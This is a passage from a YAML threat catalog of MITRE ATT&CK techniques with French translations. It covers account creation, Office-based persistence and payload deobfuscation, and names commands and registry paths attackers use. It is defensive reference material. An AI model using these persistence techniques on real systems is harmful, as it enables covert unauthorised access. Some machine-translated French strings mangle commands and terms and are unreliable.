      Accounts may be created on the local system or within a domain or cloud tenant.
      In cloud environments, adversaries may create accounts that only have access
      to specific services, which can reduce the chance of detection.

      https://attack.mitre.org/techniques/T1136'
    translations:
      fr:
        name: "Cr\xE9er un compte"
        description: "Les adversaires peuvent cr\xE9er un compte pour maintenir l\u2019\
          acc\xE8s aux syst\xE8mes des victimes. (Citation : Symantec WastedLocker,\
          \ juin 2020) Avec un niveau d\u2019acc\xE8s suffisant, la cr\xE9ation de\
          \ tels comptes peut servir \xE0 \xE9tablir un acc\xE8s secondaire accr\xE9\
          dit\xE9 qui ne n\xE9cessite pas le d\xE9ploiement d\u2019outils d\u2019\
          acc\xE8s \xE0 distance persistants sur le syst\xE8me.\n\nLes comptes peuvent\
          \ \xEAtre cr\xE9\xE9s sur le syst\xE8me local ou au sein d\u2019un domaine\
          \ ou d\u2019un locataire cloud. Dans les environnements cloud, les adversaires\
          \ peuvent cr\xE9er des comptes qui n\u2019ont acc\xE8s qu\u2019\xE0 des\
          \ services sp\xE9cifiques, ce qui peut r\xE9duire le risque de d\xE9tection.\n\
          https://attack.mitre.org/techniques/T1136"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1136.001
    ref_id: T1136.001
    name: Local Account
    description: "Adversaries may create a local account to maintain access to victim\
      \ systems. Local accounts are those configured by an organization for use by\
      \ users, remote support, services, or for administration on a single system\
      \ or service. \n\nFor example, with a sufficient level of access, the Windows\
      \ <code>net user /add</code> command can be used to create a local account.\
      \  In Linux, the `useradd` command can be used, while on macOS systems, the\
      \ <code>dscl -create</code> command can be used. Local accounts may also be\
      \ added to network devices, often via common [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)\
      \ commands such as <code>username</code>, to ESXi servers via `esxcli system\
      \ account add`, or to Kubernetes clusters using the `kubectl` utility.(Citation:\
      \ cisco_username_cmd)(Citation: Kubernetes Service Accounts Security)\n\nAdversaries\
      \ may also create new local accounts on network firewall management consoles\
      \ \u2013 for example, by exploiting a vulnerable firewall management system,\
      \ threat actors may be able to establish super-admin accounts that could be\
      \ used to modify firewall rules and gain further access to the network.(Citation:\
      \ Cyber Security News)\n\nSuch accounts may be used to establish secondary credentialed\
      \ access that do not require persistent remote access tools to be deployed on\
      \ the system.\nhttps://attack.mitre.org/techniques/T1136/001"
    translations:
      fr:
        name: Compte local
        description: "Les adversaires peuvent cr\xE9er un compte local pour maintenir\
          \ l\u2019acc\xE8s aux syst\xE8mes des victimes. Les comptes locaux sont\
          \ ceux configur\xE9s par une organisation pour une utilisation par les utilisateurs,\
          \ le support \xE0 distance, des services ou pour l\u2019administration d\u2019\
          un seul syst\xE8me ou service. \n\nPar exemple, avec un niveau d\u2019acc\xE8\
          s suffisant, la commande <code>Windows net user /add</code> peut \xEAtre\
          \ utilis\xE9e pour cr\xE9er un compte local.  Sous Linux, la commande 'useradd'\
          \ peut \xEAtre utilis\xE9e, tandis que sur les syst\xE8mes macOS, la commande\
          \ <code>dscl -create</code> peut \xEAtre utilis\xE9e. Les comptes locaux\
          \ peuvent \xE9galement \xEAtre ajout\xE9s aux dispositifs r\xE9seau, souvent\
          \ via des commandes courantes [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)\
          \ telles que <code>le nom d\u2019utilisateur</code>, aux serveurs ESXi via\
          \ \xAB esxcli system account add \xBB, ou aux clusters Kubernetes via l\u2019\
          utilitaire \xAB kubectl \xBB. (Citation : cisco_username_cmd)(Citation :\
          \ S\xE9curit\xE9 des comptes de service Kubernetes)\n\nLes adversaires peuvent\
          \ \xE9galement cr\xE9er de nouveaux comptes locaux sur les consoles de gestion\
          \ des pare-feu r\xE9seau \u2013 par exemple, en exploitant un syst\xE8me\
          \ de gestion de pare-feu vuln\xE9rable, les acteurs malveillants peuvent\
          \ cr\xE9er des comptes super-administrateurs qui pourraient \xEAtre utilis\xE9\
          s pour modifier les r\xE8gles du pare-feu et obtenir un acc\xE8s suppl\xE9\
          mentaire au r\xE9seau. (Citation : Cyber Security News)\n\nCes comptes peuvent\
          \ \xEAtre utilis\xE9s pour \xE9tablir un acc\xE8s secondaire avec accr\xE9\
          ditations qui ne n\xE9cessitent pas le d\xE9ploiement d\u2019outils d\u2019\
          acc\xE8s distant persistants sur le syst\xE8me.\nhttps://attack.mitre.org/techniques/T1136/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1136.002
    ref_id: T1136.002
    name: Domain Account
    description: 'Adversaries may create a domain account to maintain access to victim
      systems. Domain accounts are those managed by Active Directory Domain Services
      where access and permissions are configured across systems and services that
      are part of that domain. Domain accounts can cover user, administrator, and
      service accounts. With a sufficient level of access, the <code>net user /add
      /domain</code> command can be used to create a domain account.(Citation: Savill
      1999)


      Such accounts may be used to establish secondary credentialed access that do
      not require persistent remote access tools to be deployed on the system.

      https://attack.mitre.org/techniques/T1136/002'
    translations:
      fr:
        name: Compte de domaine
        description: "Les adversaires peuvent cr\xE9er un compte de domaine pour maintenir\
          \ l\u2019acc\xE8s aux syst\xE8mes victimes. Les comptes de domaine sont\
          \ ceux g\xE9r\xE9s par Active Directory Domain Services, o\xF9 l\u2019acc\xE8\
          s et les permissions sont configur\xE9s entre les syst\xE8mes et services\
          \ faisant partie de ce domaine. Les comptes de domaine peuvent couvrir les\
          \ comptes utilisateur, administrateur et service. Avec un niveau d\u2019\
          acc\xE8s suffisant, la commande <code>/add /domain de l\u2019utilisateur\
          \ du net</code> peut \xEAtre utilis\xE9e pour cr\xE9er un compte de domaine.\
          \ (Citation : Savill 1999)\n\nCes comptes peuvent \xEAtre utilis\xE9s pour\
          \ \xE9tablir un acc\xE8s secondaire avec accr\xE9ditations qui ne n\xE9\
          cessitent pas le d\xE9ploiement d\u2019outils d\u2019acc\xE8s distant persistants\
          \ sur le syst\xE8me.\nhttps://attack.mitre.org/techniques/T1136/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1136.003
    ref_id: T1136.003
    name: Cloud Account
    description: 'Adversaries may create a cloud account to maintain access to victim
      systems. With a sufficient level of access, such accounts may be used to establish
      secondary credentialed access that does not require persistent remote access
      tools to be deployed on the system.(Citation: Microsoft O365 Admin Roles)(Citation:
      Microsoft Support O365 Add Another Admin, October 2019)(Citation: AWS Create
      IAM User)(Citation: GCP Create Cloud Identity Users)(Citation: Microsoft Azure
      AD Users)


      In addition to user accounts, cloud accounts may be associated with services.
      Cloud providers handle the concept of service accounts in different ways. In
      Azure, service accounts include service principals and managed identities, which
      can be linked to various resources such as OAuth applications, serverless functions,
      and virtual machines in order to grant those resources permissions to perform
      various activities in the environment.(Citation: Microsoft Entra ID Service
      Principals) In GCP, service accounts can also be linked to specific resources,
      as well as be impersonated by other accounts for [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005).(Citation:
      GCP Service Accounts) While AWS has no specific concept of service accounts,
      resources can be directly granted permission to assume roles.(Citation: AWS
      Instance Profiles)(Citation: AWS Lambda Execution Role)


      Adversaries may create accounts that only have access to specific cloud services,
      which can reduce the chance of detection.


      Once an adversary has created a cloud account, they can then manipulate that
      account to ensure persistence and allow access to additional resources - for
      example, by adding [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001)
      or assigning [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).

      https://attack.mitre.org/techniques/T1136/003'
    translations:
      fr:
        name: Compte Cloud
        description: "Les adversaires peuvent cr\xE9er un compte cloud pour maintenir\
          \ l\u2019acc\xE8s aux syst\xE8mes des victimes. Avec un niveau d\u2019acc\xE8\
          s suffisant, ces comptes peuvent \xEAtre utilis\xE9s pour \xE9tablir un\
          \ acc\xE8s secondaire accr\xE9dit\xE9 qui ne n\xE9cessite pas le d\xE9ploiement\
          \ d\u2019outils d\u2019acc\xE8s \xE0 distance persistants sur le syst\xE8\
          me. (Citation : R\xF4les d\u2019administrateur Microsoft O365)(Citation\
          \ : Soutien Microsoft O365 Ajouter un autre admin, octobre 2019)(Citation\
          \ : AWS Create IAM User)(Citation : GCP Create Cloud Identity Users)(Citation\
          \ : Utilisateurs Microsoft Azure AD)\n\nEn plus des comptes utilisateurs,\
          \ les comptes cloud peuvent \xEAtre associ\xE9s \xE0 des services. Les fournisseurs\
          \ cloud g\xE8rent le concept de comptes de service de diff\xE9rentes mani\xE8\
          res. Dans Azure, les comptes de service incluent des principaux de service\
          \ et des identit\xE9s g\xE9r\xE9es, qui peuvent \xEAtre reli\xE9s \xE0 diverses\
          \ ressources telles que des applications OAuth, des fonctions serverless\
          \ et des machines virtuelles afin d\u2019accorder \xE0 ces ressources des\
          \ autorisations d\u2019effectuer diverses activit\xE9s dans l\u2019environnement.\
          \ (Citation : Microsoft Entra ID Service Principals) Dans GCP, les comptes\
          \ de service peuvent \xE9galement \xEAtre li\xE9s \xE0 des ressources sp\xE9\
          cifiques, ainsi que \xEAtre usurp\xE9s par d\u2019autres comptes pour [Temporary\
          \ Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005).\
          \ (Citation : Comptes de service GCP) Bien qu\u2019AWS n\u2019ait pas de\
          \ concept sp\xE9cifique de comptes de service, les ressources peuvent \xEA\
          tre directement autoris\xE9es \xE0 assumer des r\xF4les. (Citation : Profils\
          \ d\u2019instances AWS)(Citation : AWS Lambda Execution Role)\n\nLes adversaires\
          \ peuvent cr\xE9er des comptes n\u2019ayant acc\xE8s qu\u2019\xE0 des services\
          \ cloud sp\xE9cifiques, ce qui peut r\xE9duire le risque de d\xE9tection.\n\
          \nUne fois qu\u2019un adversaire a cr\xE9\xE9 un compte cloud, il peut alors\
          \ manipuler ce compte pour assurer sa persistance et permettre l\u2019acc\xE8\
          s \xE0 des ressources suppl\xE9mentaires \u2013 par exemple, en ajoutant\
          \ des [identifiants cloud suppl\xE9mentaires](https://attack.mitre.org/techniques/T1098/001)\
          \ ou en attribuant des [r\xF4les cloud suppl\xE9mentaires](https://attack.mitre.org/techniques/T1098/003).\n\
          https://attack.mitre.org/techniques/T1136/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1137
    ref_id: T1137
    name: Office Application Startup
    description: 'Adversaries may leverage Microsoft Office-based applications for
      persistence between startups. Microsoft Office is a fairly common application
      suite on Windows-based operating systems within an enterprise network. There
      are multiple mechanisms that can be used with Office for persistence when an
      Office-based application is started; this can include the use of Office Template
      Macros and add-ins.


      A variety of features have been discovered in Outlook that can be abused to
      obtain persistence, such as Outlook rules, forms, and Home Page.(Citation: SensePost
      Ruler GitHub) These persistence mechanisms can work within Outlook or be used
      through Office 365.(Citation: TechNet O365 Outlook Rules)

      https://attack.mitre.org/techniques/T1137'
    translations:
      fr:
        name: "D\xE9marrage d\u2019applications Office"
        description: "Les adversaires peuvent tirer parti des applications bas\xE9\
          es sur Microsoft Office pour assurer la persistance entre les startups.\
          \ Microsoft Office est une suite d\u2019applications assez courante sur\
          \ les syst\xE8mes d\u2019exploitation Windows au sein d\u2019un r\xE9seau\
          \ d\u2019entreprise. Il existe plusieurs m\xE9canismes pouvant \xEAtre utilis\xE9\
          s avec Office pour la persistance lors du d\xE9marrage d\u2019une application\
          \ bas\xE9e sur Office ; cela peut inclure l\u2019utilisation de macros de\
          \ mod\xE8les Office et d\u2019extensions.\n\nUne vari\xE9t\xE9 de fonctionnalit\xE9\
          s ont \xE9t\xE9 d\xE9couvertes dans Outlook qui peuvent \xEAtre exploit\xE9\
          es pour obtenir de la persistance, telles que les r\xE8gles Outlook, les\
          \ formulaires et la page d\u2019accueil. (Citation : GitHub de la r\xE8\
          gle SensePost) Ces m\xE9canismes de persistance peuvent fonctionner dans\
          \ Outlook ou \xEAtre utilis\xE9s via Office 365. (Citation : R\xE8gles Outlook\
          \ TechNet O365)\nhttps://attack.mitre.org/techniques/T1137"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1137.001
    ref_id: T1137.001
    name: Office Template Macros
    description: "Adversaries may abuse Microsoft Office templates to obtain persistence\
      \ on a compromised system. Microsoft Office contains templates that are part\
      \ of common Office applications and are used to customize styles. The base templates\
      \ within the application are used each time an application starts. (Citation:\
      \ Microsoft Change Normal Template)\n\nOffice Visual Basic for Applications\
      \ (VBA) macros (Citation: MSDN VBA in Office) can be inserted into the base\
      \ template and used to execute code when the respective Office application starts\
      \ in order to obtain persistence. Examples for both Word and Excel have been\
      \ discovered and published. By default, Word has a Normal.dotm template created\
      \ that can be modified to include a malicious macro. Excel does not have a template\
      \ file created by default, but one can be added that will automatically be loaded.(Citation:\
      \ enigma0x3 normal.dotm)(Citation: Hexacorn Office Template Macros) Shared templates\
      \ may also be stored and pulled from remote locations.(Citation: GlobalDotName\
      \ Jun 2019) \n\nWord Normal.dotm location:<br>\n<code>C:\\Users\\&lt;username&gt;\\\
      AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm</code>\n\nExcel Personal.xlsb\
      \ location:<br>\n<code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\\
      Excel\\XLSTART\\PERSONAL.XLSB</code>\n\nAdversaries may also change the location\
      \ of the base template to point to their own by hijacking the application's\
      \ search order, e.g. Word 2016 will first look for Normal.dotm under <code>C:\\\
      Program Files (x86)\\Microsoft Office\\root\\Office16\\</code>, or by modifying\
      \ the GlobalDotName registry key. By modifying the GlobalDotName registry key\
      \ an adversary can specify an arbitrary location, file name, and file extension\
      \ to use for the template that will be loaded on application startup. To abuse\
      \ GlobalDotName, adversaries may first need to register the template as a trusted\
      \ document or place it in a trusted location.(Citation: GlobalDotName Jun 2019)\
      \ \n\nAn adversary may need to enable macros to execute unrestricted depending\
      \ on the system or enterprise security policy on use of macros.\nhttps://attack.mitre.org/techniques/T1137/001"
    translations:
      fr:
        name: "Macros de mod\xE8les de bureau"
        description: "Les adversaires peuvent abuser des mod\xE8les Microsoft Office\
          \ pour obtenir la persistance sur un syst\xE8me compromis. Microsoft Office\
          \ contient des mod\xE8les qui font partie des applications Office courantes\
          \ et sont utilis\xE9s pour personnaliser des styles. Les mod\xE8les de base\
          \ de l\u2019application sont utilis\xE9s \xE0 chaque lancement d\u2019une\
          \ application. (Citation : Microsoft a modifi\xE9 le mod\xE8le normal)\n\
          \nLes macros Office Visual Basic for Applications (VBA) (Citation : MSDN\
          \ VBA in Office) peuvent \xEAtre ins\xE9r\xE9es dans le mod\xE8le de base\
          \ et utilis\xE9es pour ex\xE9cuter du code au d\xE9marrage de l\u2019application\
          \ Office respective afin d\u2019obtenir la persistance. Des exemples pour\
          \ Word et Excel ont \xE9t\xE9 d\xE9couverts et publi\xE9s. Par d\xE9faut,\
          \ Word dispose d\u2019un mod\xE8le Normal.dotm cr\xE9\xE9 qui peut \xEA\
          tre modifi\xE9 pour inclure une macro malveillante. Excel n\u2019a pas de\
          \ fichier mod\xE8le cr\xE9\xE9 par d\xE9faut, mais un fichier peut \xEA\
          tre ajout\xE9 et sera automatiquement charg\xE9. (Citation : enigma0x3 normal.dotm)(Citation\
          \ : Macros du mod\xE8le de bureau Hexacorn) Les mod\xE8les partag\xE9s peuvent\
          \ \xE9galement \xEAtre stock\xE9s et extraits depuis des lieux \xE9loign\xE9\
          s. (Citation : GlobalDotName juin 2019) \n\nLocalisation Word Normal.dotm\
          \ :<br>\n<code>C :\\Users\\&lt;nom d\u2019utilisateur&gt;\\AppData\\Roaming\\\
          Microsoft\\Templates\\Normal.dotm</code>\n\nEmplacement Excel Personal.xlsb\
          \ :<br>\n<code>C\_:\\Utilisateurs\\&lt;nom d\u2019utilisateur&gt;\\AppData\\\
          Roaming\\Microsoft\\Excel\\XLSTART\\PERSONNEL. XLSB</code>\n\nLes adversaires\
          \ peuvent \xE9galement modifier l\u2019emplacement du mod\xE8le de base\
          \ pour pointer vers le leur en d\xE9tournant l\u2019ordre de recherche de\
          \ l\u2019application, par exemple Word 2016 cherchera d\u2019abord Normal.dotm\
          \ sous <code>C\_:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\\
          </code>, ou en modifiant la cl\xE9 de registre GlobalDotName. En modifiant\
          \ la cl\xE9 de registre GlobalDotName, un adversaire peut sp\xE9cifier un\
          \ emplacement, un nom de fichier et une extension de fichier arbitraires\
          \ \xE0 utiliser pour le mod\xE8le qui sera charg\xE9 au d\xE9marrage de\
          \ l\u2019application. Pour abuser de GlobalDotName, les adversaires peuvent\
          \ d\u2019abord devoir enregistrer le mod\xE8le comme document de confiance\
          \ ou le placer dans un lieu de confiance. (Citation : GlobalDotName juin\
          \ 2019) \n\nUn adversaire peut devoir permettre l\u2019ex\xE9cution des\
          \ macros sans restriction selon la politique de s\xE9curit\xE9 du syst\xE8\
          me ou de l\u2019entreprise concernant l\u2019utilisation des macros.\nhttps://attack.mitre.org/techniques/T1137/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1137.002
    ref_id: T1137.002
    name: Office Test
    description: 'Adversaries may abuse the Microsoft Office "Office Test" Registry
      key to obtain persistence on a compromised system. An Office Test Registry location
      exists that allows a user to specify an arbitrary DLL that will be executed
      every time an Office application is started. This Registry key is thought to
      be used by Microsoft to load DLLs for testing and debugging purposes while developing
      Office applications. This Registry key is not created by default during an Office
      installation.(Citation: Hexacorn Office Test)(Citation: Palo Alto Office Test
      Sofacy)


      There exist user and global Registry keys for the Office Test feature, such
      as:


      * <code>HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf</code>

      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Office test\Special\Perf</code>


      Adversaries may add this Registry key and specify a malicious DLL that will
      be executed whenever an Office application, such as Word or Excel, is started.

      https://attack.mitre.org/techniques/T1137/002'
    translations:
      fr:
        name: Test de bureau
        description: "Les adversaires peuvent abuser de la cl\xE9 du registre \xAB\
          \ Office Test \xBB de Microsoft Office pour obtenir de la persistance sur\
          \ un syst\xE8me compromis. Un emplacement Office Test Registry existe qui\
          \ permet \xE0 un utilisateur de sp\xE9cifier une DLL arbitraire qui sera\
          \ ex\xE9cut\xE9e \xE0 chaque lancement d\u2019une application Office. Cette\
          \ cl\xE9 de registre serait utilis\xE9e par Microsoft pour charger des DLL\
          \ \xE0 des fins de test et de d\xE9bogage lors du d\xE9veloppement d\u2019\
          applications Office. Cette cl\xE9 du Registre n\u2019est pas cr\xE9\xE9\
          e par d\xE9faut lors d\u2019une installation Office. (Citation : Test du\
          \ Bureau de l\u2019Hexacorne)(Citation : Sofacy de test du bureau de Palo\
          \ Alto)\n\nIl existe des cl\xE9s utilisateur et globales du registre pour\
          \ la fonction Office Test, telles que :\n\n* <code>HKEY_CURRENT_USER\\Software\\\
          Microsoft\\Office test\\Special\\Perf</code>\n* <code>HKEY_LOCAL_MACHINE\\\
          Logiciel\\Microsoft\\Office test\\Special\\Perf</code>\n\nLes adversaires\
          \ peuvent ajouter cette cl\xE9 du Registre et sp\xE9cifier une DLL malveillante\
          \ qui sera ex\xE9cut\xE9e chaque fois qu\u2019une application Office, telle\
          \ que Word ou Excel, sera lanc\xE9e.\nhttps://attack.mitre.org/techniques/T1137/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1137.003
    ref_id: T1137.003
    name: Outlook Forms
    description: "Adversaries may abuse Microsoft Outlook forms to obtain persistence\
      \ on a compromised system. Outlook forms are used as templates for presentation\
      \ and functionality in Outlook messages. Custom Outlook forms can be created\
      \ that will execute code when a specifically crafted email is sent by an adversary\
      \ utilizing the same custom Outlook form.(Citation: SensePost Outlook Forms)\n\
      \nOnce malicious forms have been added to the user\u2019s mailbox, they will\
      \ be loaded when Outlook is started. Malicious forms will execute when an adversary\
      \ sends a specifically crafted email to the user.(Citation: SensePost Outlook\
      \ Forms)\nhttps://attack.mitre.org/techniques/T1137/003"
    translations:
      fr:
        name: Formulaires Outlook
        description: "Les adversaires peuvent abuser des formulaires Microsoft Outlook\
          \ pour obtenir de la persistance sur un syst\xE8me compromis. Les formulaires\
          \ Outlook sont utilis\xE9s comme mod\xE8les pour la pr\xE9sentation et les\
          \ fonctionnalit\xE9s dans les messages Outlook. Des formulaires Outlook\
          \ personnalis\xE9s peuvent \xEAtre cr\xE9\xE9s pour ex\xE9cuter du code\
          \ lorsqu\u2019un e-mail sp\xE9cifiquement con\xE7u est envoy\xE9 par un\
          \ adversaire en utilisant le m\xEAme formulaire Outlook personnalis\xE9\
          . (Citation : Formulaires d\u2019Analyse SensePost)\n\nUne fois que les\
          \ formulaires malveillants ont \xE9t\xE9 ajout\xE9s \xE0 la bo\xEEte aux\
          \ lettres de l\u2019utilisateur, ils seront charg\xE9s lors du d\xE9marrage\
          \ d\u2019Outlook. Les formulaires malveillants s\u2019ex\xE9cutent lorsqu\u2019\
          un adversaire envoie un e-mail sp\xE9cifiquement con\xE7u \xE0 l\u2019utilisateur.\
          \ (Citation : Formulaires d\u2019Analyse SensePost)\nhttps://attack.mitre.org/techniques/T1137/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1137.004
    ref_id: T1137.004
    name: Outlook Home Page
    description: "Adversaries may abuse Microsoft Outlook's Home Page feature to obtain\
      \ persistence on a compromised system. Outlook Home Page is a legacy feature\
      \ used to customize the presentation of Outlook folders. This feature allows\
      \ for an internal or external URL to be loaded and presented whenever a folder\
      \ is opened. A malicious HTML page can be crafted that will execute code when\
      \ loaded by Outlook Home Page.(Citation: SensePost Outlook Home Page)\n\nOnce\
      \ malicious home pages have been added to the user\u2019s mailbox, they will\
      \ be loaded when Outlook is started. Malicious Home Pages will execute when\
      \ the right Outlook folder is loaded/reloaded.(Citation: SensePost Outlook Home\
      \ Page)\nhttps://attack.mitre.org/techniques/T1137/004"
    translations:
      fr:
        name: "Page d\u2019accueil Outlook"
        description: "Les adversaires peuvent abuser de la fonctionnalit\xE9 de Page\
          \ d\u2019accueil de Microsoft Outlook pour obtenir de la persistance sur\
          \ un syst\xE8me compromis. La page d\u2019accueil d\u2019Outlook est une\
          \ fonctionnalit\xE9 h\xE9rit\xE9e utilis\xE9e pour personnaliser la pr\xE9\
          sentation des dossiers Outlook. Cette fonctionnalit\xE9 permet de charger\
          \ et de pr\xE9senter une URL interne ou externe chaque fois qu\u2019un dossier\
          \ est ouvert. Une page HTML malveillante peut \xEAtre cr\xE9\xE9e et ex\xE9\
          cutera du code lorsqu\u2019elle sera charg\xE9e par Outlook Home Page. (Citation\
          \ : Page d\u2019accueil Outlook de SensePost)\n\nUne fois que les pages\
          \ d\u2019accueil malveillantes ont \xE9t\xE9 ajout\xE9es \xE0 la bo\xEE\
          te aux lettres de l\u2019utilisateur, elles seront charg\xE9es au d\xE9\
          marrage d\u2019Outlook. Les pages d\u2019accueil malveillantes s\u2019ex\xE9\
          cutent lorsque le bon dossier Outlook est charg\xE9 ou recharg\xE9. (Citation\
          \ : Page d\u2019accueil Outlook de SensePost)\nhttps://attack.mitre.org/techniques/T1137/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1137.005
    ref_id: T1137.005
    name: Outlook Rules
    description: "Adversaries may abuse Microsoft Outlook rules to obtain persistence\
      \ on a compromised system. Outlook rules allow a user to define automated behavior\
      \ to manage email messages. A benign rule might, for example, automatically\
      \ move an email to a particular folder in Outlook if it contains specific words\
      \ from a specific sender. Malicious Outlook rules can be created that can trigger\
      \ code execution when an adversary sends a specifically crafted email to that\
      \ user.(Citation: SilentBreak Outlook Rules)\n\nOnce malicious rules have been\
      \ added to the user\u2019s mailbox, they will be loaded when Outlook is started.\
      \ Malicious rules will execute when an adversary sends a specifically crafted\
      \ email to the user.(Citation: SilentBreak Outlook Rules)\nhttps://attack.mitre.org/techniques/T1137/005"
    translations:
      fr:
        name: "R\xE8gles de perspective"
        description: "Les adversaires peuvent abuser des r\xE8gles Microsoft Outlook\
          \ pour obtenir de la persistance sur un syst\xE8me compromis. Les r\xE8\
          gles d\u2019Outlook permettent \xE0 un utilisateur de d\xE9finir un comportement\
          \ automatis\xE9 pour g\xE9rer les messages e-mail. Une r\xE8gle b\xE9nigne\
          \ pourrait, par exemple, d\xE9placer automatiquement un e-mail vers un dossier\
          \ particulier dans Outlook s\u2019il contient des mots sp\xE9cifiques d\u2019\
          un exp\xE9diteur sp\xE9cifique. Des r\xE8gles malveillantes d\u2019Outlook\
          \ peuvent \xEAtre cr\xE9\xE9es et d\xE9clencher l\u2019ex\xE9cution du code\
          \ lorsqu\u2019un adversaire envoie un e-mail sp\xE9cifiquement con\xE7u\
          \ \xE0 cet utilisateur. (Citation : R\xE8gles d\u2019Outlook de SilentBreak)\n\
          \nUne fois que les r\xE8gles malveillantes ont \xE9t\xE9 ajout\xE9es \xE0\
          \ la bo\xEEte aux lettres de l\u2019utilisateur, elles seront charg\xE9\
          es au lancement d\u2019Outlook. Les r\xE8gles malveillantes s\u2019ex\xE9\
          cutent lorsqu\u2019un adversaire envoie un e-mail sp\xE9cialement con\xE7\
          u \xE0 l\u2019utilisateur. (Citation : R\xE8gles d\u2019Outlook de SilentBreak)\n\
          https://attack.mitre.org/techniques/T1137/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1137.006
    ref_id: T1137.006
    name: Add-ins
    description: 'Adversaries may abuse Microsoft Office add-ins to obtain persistence
      on a compromised system. Office add-ins can be used to add functionality to
      Office programs. (Citation: Microsoft Office Add-ins) There are different types
      of add-ins that can be used by the various Office products; including Word/Excel
      add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM)
      add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office
      (VSTO) add-ins, and Outlook add-ins. (Citation: MRWLabs Office Persistence Add-ins)(Citation:
      FireEye Mail CDS 2018)


      Add-ins can be used to obtain persistence because they can be set to execute
      code when an Office application starts.

      https://attack.mitre.org/techniques/T1137/006'
    translations:
      fr:
        name: Extensions
        description: "Les adversaires peuvent abuser des modules compl\xE9mentaires\
          \ Microsoft Office pour obtenir de la persistance sur un syst\xE8me compromis.\
          \ Les modules compl\xE9mentaires Office peuvent \xEAtre utilis\xE9s pour\
          \ ajouter des fonctionnalit\xE9s aux programmes Office. (Citation : modules\
          \ compl\xE9mentaires Microsoft Office) Il existe diff\xE9rents types d\u2019\
          extensions qui peuvent \xEAtre utilis\xE9es par les diff\xE9rents produits\
          \ Office ; y compris les biblioth\xE8ques compl\xE9mentaires Word/Excel\
          \ (WLL/XLL), les modules compl\xE9mentaires VBA, les modules compl\xE9mentaires\
          \ Office Component Object Model (COM), les modules compl\xE9mentaires d\u2019\
          automatisation, l\u2019\xE9diteur VBA (VBE), les modules compl\xE9mentaires\
          \ Visual Studio Tools for Office (VSTO) et les modules compl\xE9mentaires\
          \ Outlook. (Citation : Compl\xE9ments de persistance du bureau MRWLabs)(Citation\
          \ : FireEye Mail CDS 2018)\n\nLes compl\xE9ments peuvent \xEAtre utilis\xE9\
          s pour obtenir la persistance car ils peuvent \xEAtre configur\xE9s pour\
          \ ex\xE9cuter du code lors du d\xE9marrage d\u2019une application Office.\n\
          https://attack.mitre.org/techniques/T1137/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1140
    ref_id: T1140
    name: Deobfuscate/Decode Files or Information
    description: 'Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027)
      to hide artifacts of an intrusion from analysis. They may require separate mechanisms
      to decode or deobfuscate that information depending on how they intend to use
      it. Methods for doing that include built-in functionality of malware or by using
      utilities present on the system.


      One such example is the use of [certutil](https://attack.mitre.org/software/S0160)
      to decode a remote access tool portable executable file that has been hidden
      inside a certificate file.(Citation: Malwarebytes Targeted Attack against Saudi
      Arabia) Another example is using the Windows <code>copy /b</code> or <code>type</code>
      command to reassemble binary fragments into a malicious payload.(Citation: Carbon
      Black Obfuscation Sept 2016)(Citation: Sentinel One Tainted Love 2023)


      Sometimes a user''s action may be required to open it for deobfuscation or decryption
      as part of [User Execution](https://attack.mitre.org/techniques/T1204). The
      user may also be required to input a password to open a password protected compressed/encrypted
      file that was provided by the adversary.(Citation: Volexity PowerDuke November
      2016)

      https://attack.mitre.org/techniques/T1140'
    translations:
      fr:
        name: "D\xE9bloquer/D\xE9coder des fichiers ou informations"
        description: "Les adversaires peuvent utiliser [Fichiers ou informations obscurcis]\
          \ (https://attack.mitre.org/techniques/T1027) pour dissimuler les artefacts\
          \ d\u2019une intrusion \xE0 l\u2019analyse. Ils peuvent n\xE9cessiter des\
          \ m\xE9canismes distincts pour d\xE9coder ou d\xE9moder ces informations\
          \ selon la mani\xE8re dont ils comptent l\u2019utiliser. Les m\xE9thodes\
          \ pour cela incluent la fonctionnalit\xE9 int\xE9gr\xE9e des malwares ou\
          \ l\u2019utilisation des utilitaires pr\xE9sents sur le syst\xE8me.\n\n\
          Un exemple est l\u2019utilisation de [certutil](https://attack.mitre.org/software/S0160)\
          \ pour d\xE9coder un fichier ex\xE9cutable portable d\u2019un outil d\u2019\
          acc\xE8s \xE0 distance qui a \xE9t\xE9 cach\xE9 \xE0 l\u2019int\xE9rieur\
          \ d\u2019un fichier certificat. (Citation : Attaque cibl\xE9e de Malwarebytes\
          \ contre l\u2019Arabie saoudite) Un autre exemple consiste \xE0 utiliser\
          \ la commande <code>Windows copy /b</code> ou <code>type</code> pour r\xE9\
          assembler des fragments binaires en une charge utile malveillante. (Citation\
          \ : Obfuscation du noir de carbone septembre 2016)(Citation : Sentinel One\
          \ Tainted Love 2023)\n\nParfois, une action d\u2019un utilisateur peut \xEA\
          tre requise pour l\u2019ouvrir afin de la d\xE9mod\xE9rer ou de le d\xE9\
          chiffrer dans le cadre de [User Execution](https://attack.mitre.org/techniques/T1204).\
          \ L\u2019utilisateur peut \xE9galement \xEAtre oblig\xE9 d\u2019entrer un\
          \ mot de passe pour ouvrir un fichier compress\xE9/chiffr\xE9 prot\xE9g\xE9\
          \ par mot de passe fourni par l\u2019adversaire. (Citation : Volexity PowerDuke\
          \ novembre 2016)\nhttps://attack.mitre.org/techniques/T1140"
